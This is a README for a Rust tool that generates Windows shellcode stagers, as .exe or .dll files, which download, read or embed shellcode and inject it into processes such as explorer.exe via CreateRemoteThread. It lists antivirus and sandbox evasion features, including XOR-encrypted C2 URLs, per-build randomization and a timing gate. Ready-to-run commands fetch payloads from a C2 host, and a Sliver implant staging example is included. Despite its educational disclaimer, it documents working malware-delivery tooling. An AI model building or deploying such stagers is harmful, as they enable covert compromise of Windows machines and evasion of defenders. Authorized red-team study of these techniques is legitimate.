# Rust Stager Generator

> **Disclaimer:** This project is intended for **educational purposes only**: learning Rust,
> studying shellcode injection techniques, and practicing for authorized security assessments
> (OSCP, OSEP, CTF).
> Use only on systems you own or have explicit written permission to test.
> The author is not responsible for any illegal or unauthorized use.

A generator that cross-compiles a tiny Windows shellcode stager (`.exe` or `.dll`) from
**Windows or Linux**. Only `rustup` is needed: no MSVC, no mingw, no Windows SDK.

The stager fetches shellcode from one of three sources and injects it into a target process:

| Source  | Option           | What the stager does                                  |
| ------- | ---------------- | ----------------------------------------------------- |
| `url`   | `--url <URL>`    | downloads shellcode from `URL` at runtime (WinHTTP)   |
| `local` | `--local <PATH>` | reads shellcode from `PATH` on the Windows machine    |
| `embed` | `--embed <FILE>` | uses `FILE`, baked into the binary at generation time |

## OPSEC Features

- **Per-build randomization** `build.rs` generates a fresh XOR key and salt every clean build,
  giving each binary a unique hash and instruction stream.
- **Compile-time target encryption** the C2 URL or file path is XOR-encrypted; no plaintext
  appears in the binary.
- **Anti-sandbox timing gate** a CPU-bound loop seeded by the per-build salt must run for
    > = 4 seconds of real time. Sandboxes that fast-forward the clock fail the gate.
- **`no_std` / no CRT** tiny binary, no standard library strings, no CRT exports visible.
- **Process injection** shellcode is allocated RW, written, flipped to RX, then executed via
  `CreateRemoteThread`. Target fallback chain: `explorer.exe` -> `RuntimeBroker.exe` ->
  `sihost.exe` -> `svchost.exe`.
- **Encrypted process names** process names are XOR-encrypted at compile time (same key
  rotation as the C2 target).
- **Certificate error bypass** ignores self-signed / lab CA certificates (useful for OSEP/HTB).

## Quick Start

```bash
# Build the generator
cargo build --release          # -> target/release/ruststager(.exe)

# Generate a stager that downloads shellcode from a C2
ruststager --url https://10.10.10.1:443/shellcode.bin

# 32-bit stager with an embedded payload
ruststager --embed payload.bin -a x86 -o stager32.exe

# DLL that runs on LoadLibrary / rundll32
ruststager --url https://10.10.10.1/sc.bin -f dll -o stager.dll

# Read shellcode from a local path at runtime
ruststager --local 'C:\Windows\Temp\sc.bin'
```

## Usage

```
ruststager [OPTIONS] <--url <URL>|--local <PATH>|--embed <FILE>> [--pid <PROCESS>]
```

| Option                  | Default        | Meaning                                                               |
| ----------------------- | -------------- | --------------------------------------------------------------------- |
| `--url <URL>`           |                | download shellcode at runtime (http/https)                            |
| `--local <PATH>`        |                | read shellcode from this path on the Windows machine                  |
| `--embed <FILE>`        |                | bake shellcode into the binary at generation time                     |
| `-f, --format exe\|dll` | `exe`          | output format                                                         |
| `-a, --arch ARCH`       | `x86_64`       | `x86_64` (`x64`), `x86` (`i686`), `aarch64` (`arm64`)                 |
| `--pid <PROCESS>`       |                | inject into this process name instead of the default chain            |
| `-o, --output FILE`     | `stager.<ext>` | output file                                                           |
| `--keep DIR`            |                | keep the generated cargo project in `DIR`                             |
| `--template DIR`        | built-in       | use an edited template (see below)                                    |
| `--dep SPEC`            |                | extra `no_std`-compatible dependency, e.g. `--dep 'heapless = "0.8"'` |
| `--no-install`          |                | don't run `rustup target add`; fail if target is missing              |
| `-v, --verbose`         |                | show cargo's output                                                   |
| `--export-template DIR` |                | write the built-in template to `DIR` and exit                         |

The first build for an architecture runs `rustup target add <triple>` (a ~20 MB download, once).
Dependencies compile once per target in a shared cache:
`%LOCALAPPDATA%\ruststager` on Windows, `~/.cache/ruststager` on Linux.

## DLL Usage

The DLL injects shellcode when loaded (`DLL_PROCESS_ATTACH`).

```bash
rundll32 stager.dll,Run
```

- **local / embed:** injection runs synchronously inside `LoadLibrary`.
- **url:** WinHTTP cannot run under the loader lock, so the download runs on a worker thread.
  `Run` waits for it; `rundll32 stager.dll,Run` works. A host that exits right after
  `LoadLibrary` returns may not finish the injection.

## Sliver Example

```
# Create profile & generate shellcode
mtls -l 80
profiles new --mtls 10.10.10.1:80 --format shellcode win-x64
profiles generate win-x64 --save /tmp/sc.bin -n test-implant
# Stage
https
implants stage

# Generate a stager that downloads the shellcode from the Sliver C2
ruststager --url http://10.10.10.1/index.html?v=ID -o stager.exe
```

## Editing the Generated Program

The stager template lives in [`template/`](template/), a normal cargo project. Its source is
[`template/src/stager.rs`](template/src/stager.rs). Build it directly for quick iteration:

```bash
cd template
cargo build --release                                           # url mode (default)
cargo build --release --no-default-features --features local    # local mode
cargo build --release --no-default-features --features embed    # embed mode
```

The path/URL comes from the compile-time env var `RG_TARGET` in `template/.cargo/config.toml`.
The embedded shellcode is `template/payload.bin`. The generator copies the template verbatim
and rewrites only:

- `Cargo.toml`: the `ruststager:target-begin/end` block, `default = [...]`, and `--dep` lines;
- `.cargo/config.toml`: the `target = ...`, `RG_TARGET = ...`, and `INJECT_PROC = ...` lines;
- `payload.bin`: replaced by the `--embed` file.

Three ways to customise the stager:

1. **Edit `template/` and rebuild the generator.** The template is embedded with
   `include_bytes!`, so the generator remains a single self-contained binary.
2. **Without rebuilding:** `ruststager --export-template mytpl`, edit `mytpl/`, then generate
   with `ruststager --template mytpl ...`.
3. **One-off:** `ruststager ... --keep proj`, edit `proj/`, then `cargo build --release` in it.

### Code rules (`no_std`, no CRT)

- No `std`, no allocator. Use `VirtualAlloc` / slice slabs for large buffers.
- **Stack frames < 4 KB** (no `__chkstk`); declare large buffers as `static mut`.
- No 64-bit division on x86 (`_aulldiv` comes from the CRT).
- Panics call `ExitProcess(101)`.
- To call another Windows API, add its windows-sys feature in `template/Cargo.toml`.
- Added crates must be `no_std` compatible.

## How Cross-Compilation Works

- Target: `<arch>-pc-windows-msvc`, linked with **`rust-lld`** (lld-link). Shipped with every
  rustup toolchain on every OS.
- **windows-sys >= 0.60** uses `#[link(kind = "raw-dylib")]` -> no `.lib` import libraries
  needed -> cross-linking works without MSVC.
- No CRT: `/NODEFAULTLIB`, custom `/ENTRY:entry`, only `core`.
- Size: `opt-level="z"`, LTO, `panic=abort`, `strip`, `/MERGE:.rdata=.text`.
- `/TIMESTAMP:0` makes builds deterministic: same input -> byte-identical output on
  Windows and Linux.
